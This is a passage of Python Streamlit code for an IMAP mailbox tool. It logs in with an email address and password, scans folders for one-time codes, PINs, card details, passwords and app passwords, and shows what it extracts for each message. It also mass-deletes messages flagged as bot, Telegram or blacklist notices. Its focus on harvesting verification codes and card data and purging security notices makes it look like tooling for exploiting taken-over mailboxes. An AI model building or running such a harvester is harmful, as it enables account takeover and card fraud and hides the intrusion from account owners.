        "ID Cards / Credentials": "id card identity credentials account info",
        "Application Passwords": "app password application password token secret",
        "Login Info / Info": "login details signin info account access"
    }

    otp_custom_keyword = st.text_input("Custom Keyword Override (Optional)", key="otp_custom_kw")

    if st.button("🚀 Execute Dedicated Security Scan", type="primary", use_container_width=True, key="otp_exec_btn"):
        host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
        if not email or not password or not host:
            st.error("Please connect and discover folders first.")
        elif not otp_scope_choice:
            st.warning("Please select at least one folder from Target Folder Scope.")
        else:
            mail = None
            try:
                target_scope = otp_scope_choice

                if otp_custom_keyword.strip():
                    kw_to_use = otp_custom_keyword.strip()
                else:
                    selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                    kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"

                with st.spinner(f"Scanning target folders ({len(target_scope)}) for security payload [{kw_to_use}]..."):
                    mail = open_mail(email, password, host, timeout=120)
                    msgs = fetch_messages_paginated(
                        mail, email, password, host, target_scope, kw_to_use, otp_search_field,
                        mode="SEARCH", page_size=page_size, page_number=1, sort_order=sort_order,
                        log_target="OTP"
                    )
                    st.session_state.otp_messages = msgs
                    st.session_state.otp_current_page = 1
                    otp_log(f"Scan complete. Retrieved {st.session_state.otp_total_matched_count} matching messages across {len(target_scope)} folders.")
            except Exception as e:
                st.error(str(e))
            finally:
                if mail:
                    close_mail(mail)

    # Standalone Security / OTP Stream
    st.markdown("#### 🔒 Standalone Security & Card Message Stream")
    otp_msgs = st.session_state.otp_messages
    otp_total = st.session_state.otp_total_matched_count or len(otp_msgs)

    if len(otp_msgs) > 0:
        otp_total_pages = max(1, math.ceil(otp_total / page_size))
        otp_curr_p = st.session_state.otp_current_page
        
        st.markdown(f"**Showing Page {otp_curr_p} of {otp_total_pages} (Total Security Matches: {otp_total})**")

        for idx, msg in enumerate(otp_msgs):
            status_icon = "📖" if msg["is_read"] else "📩"
            bot_badge = " [🔐 SENSITIVE DATA / CARD DETECTED]" if (msg["pins"] or msg.get("cards") or msg.get("creds")) else ""
            folder_badge = f" [{msg['folder']}]"

            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{bot_badge}", expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes / OTPs:** {', '.join(msg['pins'])}")
                if msg.get("cards"):
                    st.warning(f"💳 **Detected Debit, Credit Card & Purchase Details:** {', '.join(msg['cards'])}")
                if msg.get("creds"):
                    st.info(f"🔒 **Extracted Passwords / Credentials / App Passwords:** {', '.join(msg['creds'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                display_body = msg["body"] if otp_auto_clean_toggle else msg["body"]
                st.text_area("Message Payload Body", value=display_body, height=150, key=f"otp_b_{msg['folder']}_{msg['id']}_{idx}")

                o_col1, o_col2, o_col3, o_col4 = st.columns(4)
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                real_imap_folder = get_imap_path(msg['folder'])

                with o_col1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"otp_read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = open_mail(email, password, host, timeout=60)
                                m_client.select(f'"{real_imap_folder}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                close_mail(m_client)
                                msg["is_read"] = True
                                st.success("Marked as read!")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with o_col2:
                    otp_mv_target = st.selectbox("Move to", st.session_state.mb_folders, key=f"otp_mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"otp_mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            real_target_path = get_imap_path(otp_mv_target)
                            m_client = open_mail(email, password, host, timeout=60)
                            m_client.select(f'"{real_imap_folder}"', readonly=False)
                            m_client.copy(msg["id"], f'"{real_target_path}"')
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            close_mail(m_client)
                            st.session_state.otp_messages.remove(msg)
                            st.success(f"Moved to {otp_mv_target}!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with o_col3:
                    if st.button("Delete Message", key=f"otp_del_{msg['folder']}_{msg['id']}_{idx}", type="primary"):
                        try:
                            m_client = open_mail(email, password, host, timeout=60)
                            m_client.select(f'"{real_imap_folder}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            close_mail(m_client)
                            st.session_state.otp_messages.remove(msg)
                            st.success("Deleted message!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with o_col4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg["raw"].decode("utf-8", errors="ignore"))

        # OTP Stream Pagination Controls
        st.markdown("---")
        op_c1, op_c2, op_c3 = st.columns([1, 2, 1])

        with op_c1:
            if st.button("Previous Page", disabled=(otp_curr_p <= 1), use_container_width=True, key="otp_prev_pg"):
                st.session_state.otp_current_page -= 1
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                mail = open_mail(email, password, host, timeout=120)
                target_scope = otp_scope_choice if otp_scope_choice else [folder]
                if otp_custom_keyword.strip():
                    kw_to_use = otp_custom_keyword.strip()
                else:
                    selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                    kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"
                st.session_state.otp_messages = fetch_messages_paginated(
                    mail, email, password, host, target_scope, kw_to_use, otp_search_field, 
                    mode="SEARCH", page_size=page_size, page_number=st.session_state.otp_current_page, 
                    sort_order=sort_order, log_target="OTP"
                )
                close_mail(mail)
                st.rerun()

        with op_c2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {otp_curr_p} of {otp_total_pages}</h4>", unsafe_allow_html=True)

        with op_c3:
            if st.button("Next Page", disabled=(otp_curr_p >= otp_total_pages), use_container_width=True, key="otp_next_pg"):
                st.session_state.otp_current_page += 1
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                mail = open_mail(email, password, host, timeout=120)
                target_scope = otp_scope_choice if otp_scope_choice else [folder]
                if otp_custom_keyword.strip():
                    kw_to_use = otp_custom_keyword.strip()
                else:
                    selected_kws = [preset_keywords_map[cat] for cat in otp_scan_category if cat in preset_keywords_map]
                    kw_to_use = " ".join(selected_kws) if selected_kws else "card OTP debit telegram blacklist"
                st.session_state.otp_messages = fetch_messages_paginated(
                    mail, email, password, host, target_scope, kw_to_use, otp_search_field, 
                    mode="SEARCH", page_size=page_size, page_number=st.session_state.otp_current_page, 
                    sort_order=sort_order, log_target="OTP"
                )
                close_mail(mail)
                st.rerun()
    else:
        st.caption("No Debit/Credit Card, OTP or Telegram/Blacklist security messages scanned yet. Select categories or keywords and click 'Execute Dedicated Security Scan'.")

    # Standalone Diagnostic / Debug Screen
    st.markdown("#### 🛠️ OTP Engine Debugging & Diagnose Log Screen")
    with st.expander("🔐 OTP Scanner IMAP Diagnostic Traces & Logs", expanded=False):
        if st.session_state.otp_diag_logs:
            st.code("\n".join(st.session_state.otp_diag_logs), language="text")
        else:
            st.caption("OTP scanner traces and raw server logs will appear here during execution.")

# -----------------------------------------------------------------------------
# SEPARATE STANDALONE DEEP KEYWORD SEARCH & SCOPE FILTERS
# -----------------------------------------------------------------------------
st.markdown("---")
with st.expander("🔍 Deep Keyword Search & Scope Filters", expanded=False):
    s_col1, s_col2 = st.columns([1, 1])
    
    search_scope_options = ["INBOX"] + [f for f in st.session_state.mb_folders if f != "INBOX"]
    
    with s_col1:
        search_scope_choice = st.multiselect("Search Scope Option", search_scope_options, default=["INBOX"], key="deep_search_scope")
    with s_col2:
        search_field_choice = st.selectbox("Search Field Option", ["TEXT", "SUBJECT", "FROM", "BODY"], key="deep_search_field")
    
    search_query_input = st.text_input("Search term or keyword", key="deep_search_query")
    
    if st.button("🔍 Execute Keyword Search", type="primary", use_container_width=True, key="deep_search_btn"):
        host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
        if not email or not password or not host:
            st.error("Please connect and load folders first.")
        elif not search_query_input.strip():
            st.warning("Please enter a keyword or search term.")
        elif not search_scope_choice:
            st.warning("Please select at least one folder for Search Scope Option.")
        else:
            mail = None
            try:
                target_scope = search_scope_choice

                with st.spinner(f"Scanning target mailboxes ({len(target_scope)} folder/s) for [{search_field_choice}: '{search_query_input.strip()}']..."):
                    mail = open_mail(email, password, host, timeout=120)
                    msgs = fetch_messages_paginated(
                        mail, email, password, host, target_scope, search_query_input, search_field_choice, 
                        mode="SEARCH", page_size=page_size, page_number=1, sort_order=sort_order,
                        log_target="SEARCH"
                    )
                    st.session_state.search_messages = msgs
                    st.session_state.search_current_page = 1
                    log(f"Search found {st.session_state.search_total_matched_count} total matches across target scope.")
            except Exception as e:
                st.error(str(e))
            finally:
                if mail:
                    close_mail(mail)

    # Separate Search Message Stream
    st.markdown("#### ✉️ Search Results Message Stream")
    search_msgs = st.session_state.search_messages
    search_total_msgs = st.session_state.search_total_matched_count or len(search_msgs)

    if len(search_msgs) > 0:
        search_total_pages = max(1, math.ceil(search_total_msgs / page_size))
        search_curr_p = st.session_state.search_current_page
        
        st.markdown(f"**Showing Page {search_curr_p} of {search_total_pages} (Total Matches Found: {search_total_msgs})**")

        for idx, msg in enumerate(search_msgs):
            status_icon = "📖" if msg["is_read"] else "📩"
            bot_badge = " [🤖 BOT/OTP/TELEGRAM/BLACKLIST]" if msg["is_bot"] else ""
            folder_badge = f" [{msg['folder']}]"

            with st.expander(f"{status_icon}{folder_badge} [{msg['date']}] {msg['from']} - {msg['subject']}{bot_badge}", expanded=False):
                st.write(f"**Folder:** {msg['folder']}")
                st.write(f"**From:** {msg['from']}")
                st.write(f"**To:** {msg['to']}")
                st.write(f"**Subject:** {msg['subject']}")
                st.write(f"**Date:** {msg['date']}")
                st.write(f"**IMAP Message ID:** {msg['id']} | **Size:** {msg['size_bytes']} bytes")

                if msg["pins"]:
                    st.success(f"🔑 **Extracted PINs / Verification Codes:** {', '.join(msg['pins'])}")
                if msg["links"]:
                    st.markdown("🔗 **Actionable Verification Links:**")
                    for link in msg["links"]:
                        st.markdown(f"- [{link}]({link})", unsafe_allow_html=True)

                st.markdown("---")
                st.text_area("Cleaned Message Body", value=msg["body"], height=150, key=f"s_body_{msg['folder']}_{msg['id']}_{idx}")

                s_op1, s_op2, s_op3, s_op4 = st.columns(4)
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                real_imap_folder = get_imap_path(msg['folder'])

                with s_op1:
                    if not msg["is_read"]:
                        if st.button("Mark as Read", key=f"s_read_{msg['folder']}_{msg['id']}_{idx}"):
                            try:
                                m_client = open_mail(email, password, host, timeout=60)
                                m_client.select(f'"{real_imap_folder}"', readonly=False)
                                m_client.store(msg["id"], '+FLAGS', '\\Seen')
                                close_mail(m_client)
                                msg["is_read"] = True
                                st.success("Marked as read!")
                                st.rerun()
                            except Exception as ex:
                                st.error(str(ex))

                with s_op2:
                    s_target_move = st.selectbox("Move to", st.session_state.mb_folders, key=f"s_mv_sel_{msg['folder']}_{msg['id']}_{idx}")
                    if st.button("Move Message", key=f"s_mv_btn_{msg['folder']}_{msg['id']}_{idx}"):
                        try:
                            real_target_path = get_imap_path(s_target_move)
                            m_client = open_mail(email, password, host, timeout=60)
                            m_client.select(f'"{real_imap_folder}"', readonly=False)
                            m_client.copy(msg["id"], f'"{real_target_path}"')
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            close_mail(m_client)
                            st.session_state.search_messages.remove(msg)
                            st.success(f"Moved to {s_target_move}!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with s_op3:
                    s_del_label = "Delete Bot Msg" if msg["is_bot"] else "Delete Message"
                    if st.button(s_del_label, key=f"s_del_{msg['folder']}_{msg['id']}_{idx}", type="primary" if msg["is_bot"] else "secondary"):
                        try:
                            m_client = open_mail(email, password, host, timeout=60)
                            m_client.select(f'"{real_imap_folder}"', readonly=False)
                            m_client.store(msg["id"], '+FLAGS', '\\Deleted')
                            m_client.expunge()
                            close_mail(m_client)
                            st.session_state.search_messages.remove(msg)
                            st.success("Deleted message!")
                            st.rerun()
                        except Exception as ex:
                            st.error(str(ex))

                with s_op4:
                    with st.popover("View Raw RFC822"):
                        st.code(msg["raw"].decode("utf-8", errors="ignore"))

        # Search Pagination Controls
        st.markdown("---")
        sp_col1, sp_col2, sp_col3 = st.columns([1, 2, 1])

        with sp_col1:
            if st.button("Previous Page", disabled=(search_curr_p <= 1), use_container_width=True, key="s_prev_pg"):
                st.session_state.search_current_page -= 1
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                mail = open_mail(email, password, host, timeout=120)
                target_scope = search_scope_choice if search_scope_choice else [folder]
                st.session_state.search_messages = fetch_messages_paginated(
                    mail, email, password, host, target_scope, search_query_input, search_field_choice, 
                    mode="SEARCH", page_size=page_size, page_number=st.session_state.search_current_page, 
                    sort_order=sort_order, log_target="SEARCH"
                )
                close_mail(mail)
                st.rerun()

        with sp_col2:
            st.markdown(f"<h4 style='text-align: center; margin: 0;'>Page {search_curr_p} of {search_total_pages}</h4>", unsafe_allow_html=True)

        with sp_col3:
            if st.button("Next Page", disabled=(search_curr_p >= search_total_pages), use_container_width=True, key="s_next_pg"):
                st.session_state.search_current_page += 1
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                mail = open_mail(email, password, host, timeout=120)
                target_scope = search_scope_choice if search_scope_choice else [folder]
                st.session_state.search_messages = fetch_messages_paginated(
                    mail, email, password, host, target_scope, search_query_input, search_field_choice, 
                    mode="SEARCH", page_size=page_size, page_number=st.session_state.search_current_page, 
                    sort_order=sort_order, log_target="SEARCH"
                )
                close_mail(mail)
                st.rerun()
    else:
        st.caption("No search results loaded yet. Enter a query and click 'Execute Keyword Search'.")

    # Diagnostic Screen
    st.markdown("#### 🛠️ Deep Search Debugging & Diagnostic Log Screen")
    with st.expander("🔍 Search Engine IMAP Diagnostic Traces & Logs", expanded=False):
        if st.session_state.search_diag_logs:
            st.code("\n".join(st.session_state.search_diag_logs), language="text")
        else:
            st.caption("Search engine logs will be recorded here after executing a keyword search.")

# -----------------------------------------------------------------------------
# MASS BOT PURGE & INTELLIGENCE HUB
# -----------------------------------------------------------------------------
st.markdown("---")
with st.expander("🤖 Mass Bot Purge & Intelligence Hub", expanded=False):
    all_loaded_bot_msgs = [m for m in st.session_state.current_messages if m["is_bot"]]
    
    bot_col1, bot_col2 = st.columns([2, 1])
    bot_scope_options = ["INBOX"] + [f for f in st.session_state.mb_folders if f != "INBOX"]
    
    with bot_col1:
        bot_target_folder = st.multiselect(
            "Select Bot Target Scope", 
            bot_scope_options, 
            default=["INBOX"],
            key="bot_hub_folder_select"
        )
    with bot_col2:
        bot_scan_limit = st.selectbox("Bot Scan Depth", [50, 100, 200, 500], index=1)

    b_act1, b_act2 = st.columns(2)
    with b_act1:
        if st.button("🔍 Scan Folder For Bot/OTP/Telegram Messages", use_container_width=True):
            host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
            if not email or not password or not host:
                st.error("Please connect first.")
            elif not bot_target_folder:
                st.warning("Please select at least one folder for Bot Target Scope.")
            else:
                mail = None
                try:
                    target_scope = bot_target_folder
                    with st.spinner("Scanning target folders for bot & Telegram intelligence..."):
                        mail = open_mail(email, password, host, timeout=60)
                        msgs = fetch_messages_paginated(
                            mail, email, password, host, target_scope, mode="FOLDER_ONLY",
                            page_size=bot_scan_limit, page_number=1, sort_order="Newest First",
                            log_target="DEBUG"
                        )
                        st.session_state.current_messages = msgs
                        st.session_state.bot_filter_mode = True
                        st.success("Scan complete. Displaying detected bot/Telegram messages.")
                except Exception as ex:
                    st.error(str(ex))
                finally:
                    if mail:
                        close_mail(mail)

    with b_act2:
        if st.button("🚨 Mass Delete All Detected Bot Messages", type="primary", use_container_width=True):
            if not all_loaded_bot_msgs:
                st.warning("No bot messages detected in current loaded stream to delete.")
            else:
                st.session_state.bot_diag_logs = []
                host = override or st.session_state.mb_host or (host_list(email)[:1] or [""])[0]
                mail = None
                try:
                    bot_log("🤖 [BOT ENGINE DIAGNOSTIC START] Initializing Mass Deletion Sequence...")
                    bot_log(f"📋 Targets Count: {len(all_loaded_bot_msgs)} detected bot/Telegram messages")
                    mail = open_mail(email, password, host, timeout=60)
                    deleted_count = 0
                    
                    for idx, bm in enumerate(all_loaded_bot_msgs, 1):
                        r_folder = get_imap_path(bm["folder"])
                        bot_log(f"  ├─ [Msg #{idx}] ID={bm['id']} | Folder='{bm['folder']}' ({r_folder}) | From='{bm['from']}' | Subject='{bm['subject']}'")
                        sel_code, sel_res = mail.select(f'"{r_folder}"', readonly=False)
                        bot_log(f"  │   ├─ IMAP SELECT: Status={sel_code} | Res={sel_res}")
                        
                        st_code, st_res = mail.store(bm["id"], '+FLAGS', '\\Deleted')
                        bot_log(f"  │   ├─ STORE FLAGS: Status={st_code} | Res={st_res}")
                        
                        exp_code, exp_res = mail.expunge()
                        bot_log(f"  │   ├─ EXPUNGE: Status={exp_code} | Res={exp_res}")
                        
                        deleted_count += 1
                        bot_log("  │   └─ ✅ EXPOSED & PURGED from IMAP target")

                    bot_log(f"\n🏁 [MASS DELETE COMPLETE] Successfully purged {deleted_count} bot messages from server.")
                    st.success(f"Successfully deleted {deleted_count} bot messages!")
                    
                    st.session_state.current_messages = [m for m in st.session_state.current_messages if not m["is_bot"]]
                    st.session_state.bot_filter_mode = False
                    st.rerun()
                except Exception as e:
                    bot_log(f"❌ [MASS DELETE EXCEPTION]: {e}")
                    st.error(f"Error during mass delete: {e}")
                finally:
                    if mail:
                        close_mail(mail)

    st.markdown("#### 📱 Detected Bot Message Preview Screen")
    if all_loaded_bot_msgs:
        for idx, bm in enumerate(all_loaded_bot_msgs, 1):
            st.markdown(f"**[{idx}] [{bm['folder']}]** `{bm['from']}` — **{bm['subject']}** (ID: `{bm['id']}`) ")
            if bm["pins"]:
                st.info(f"🔑 PINs detected: {', '.join(bm['pins'])}")
    else:
        st.caption("No bot messages currently loaded in session memory.")

    st.markdown("#### 🛠️ Mass Bot Delete Diagnostic & Diagnose Log Screen")
    if st.session_state.bot_diag_logs:
        st.code("\n".join(st.session_state.bot_diag_logs), language="text")
    else:
        st.caption("Bot engine traces will be printed here during purge operations.")
